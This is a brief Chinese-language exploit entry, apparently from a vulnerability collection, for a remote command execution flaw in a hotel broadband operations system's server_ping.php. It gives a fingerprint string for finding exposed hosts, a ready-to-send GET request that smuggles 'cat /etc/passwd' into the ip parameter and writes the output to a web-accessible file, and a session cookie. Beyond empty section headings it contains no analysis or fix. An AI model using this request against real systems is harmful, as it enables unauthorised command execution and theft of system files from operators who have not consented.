# 酒店宽带运营系统server_ping远程命令执行漏洞

- **系统**：酒店宽带运营系统server_ping　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"酒店宽带运营"`
- **请求**：`GET /manager/radius/server_ping.php?ip=127.0.0.1cat%20/etc/passwd>../../stc.txt&id=1 HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04`

**请求体 / payload**
```
/stc.txt
```

**其他**
- 酒店宽带运营系统server\_ping远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 安美数字 酒店宽带运营系统